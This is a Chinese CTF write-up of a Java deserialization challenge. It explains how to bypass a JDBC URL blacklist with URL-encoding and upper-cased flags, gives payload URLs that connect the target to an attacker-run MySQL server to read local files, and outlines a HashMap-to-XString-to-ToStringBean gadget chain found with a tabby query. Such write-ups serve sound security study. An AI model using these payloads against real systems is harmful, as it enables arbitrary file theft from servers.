前言：临近期末备考。本来不打算打安洵杯了。下午听说有java题。上号看了一下。最后18点整做出来了。想回平台拿个flag。结果平台瞬关。没交上flag。早知道就不本地实验，直接打了，那样三血就是我啦。不过还是好爽的。第一次做出只有俩解的java。感受到了各位天天研究java师傅们的快乐了哈哈哈哈哈

回到题目

题目给了jar包。本地反编译看一下。可以看到有一个自定义的反序列化入口

进来看看可以看到禁用了一堆类

在database类里面可以看到有一个jdbc连接。但是我们的url是要通过一个filterjdbcurl检测的。

进来可以看到黑名单了。这里就是不想我们去连接恶意mysql服务器，jdbc反序列化和jdbc任意读文件。

那么我们本地直接起环境慢慢把payload调出来就行了。jdbc:mysql用urlencode绕过就行了。autoDeserialize=true和allowLoadLocalInfile=true直接大写就可以绕过了。然后写payload的时候，直接把我们的自定义的url赋值给Database属性就行了，后面那些拼接直接#忽略就行了。

可以用于绕过黑名单连接
url=jdbc:%6d%79%73%71%6c://192.168.79.128:3307/test?user=fileread_C:\application.jar&ALLOWLOADLOCALINFILE=true&maxAllowedPacket=655360&allowUrlInLocalInfile=true

用于赋给database的
%6d%79%73%71%6c://xx.xx.xx.xx:3307/test?user=fileread_file:///&ALLOWLOADLOCALINFILE=true&maxAllowedPacket=655360&allowUrlInLocalInfile=true#

然后接下来就是重点了怎么才能触发database类的getconnection方法呢。我们这里可以看到有一个rome依赖。它的ToStringBean类的toString方法是可以调用指定类的getter方法的。

但是我们怎样调用ToStringBean类的toString方法呢。在rome链分析，我们可以知道rome的ObjectBean类和EqualsBean类都是可以调用指定类的toString方法的。但是出题人也考虑到了，放到了黑名单里面。另一个调用指定类的toString方法是用BadAttributeValueExpException类，不过很遗憾也被过滤了。那么现在关键也是这题的精髓其实就是找哪个类可以触发指定类的toString方法了。会用tabby的java爷可以用下列语句去找这个gadget

利用tabby写出如下查询语句
match (source:Method {NAME:"readObject",CLASSNAME:"java.util.HashMap"})
match (sink:Method {NAME:"toString"})
with source, collect(sink) as sinks
call tabby.algo.findJavaGadget(source, sinks, 12, false) yield path where none(n in nodes(path) where n.CLASSNAME in ["javax.management.BadAttributeValueExpException","com.sun.jmx.snmp.SnmpEngineId","com.sun.xml.internal.ws.api.BindingID","javax.swing.text.html.HTML$UnknownTag"])
return path limit 1

最后是可以发现jdk里面是存在这条链子的。这个春秋公众号之前有篇文章介绍tabby的时候已经跑过这个链子了。不过只给了链子关系。没给exp。这就需要大家自己写了。

java.util.HashMap#readObject
java.util.HashMap#putVal
java.lang.Object#equals
com.sun.org.apache.xpath.internal.objects.XString#equals
指定类#toString

在hashmap的readObject里面触发putVal

然后来到这里触发com.sun.org.apache.xpath.internal.objects.XString的equals方法

最后成功触发指定类的toString方法。

最后写exp，我是套用了茯苓师傅的二次反序列化文章里面的一个调用链的hashtable类来触发的
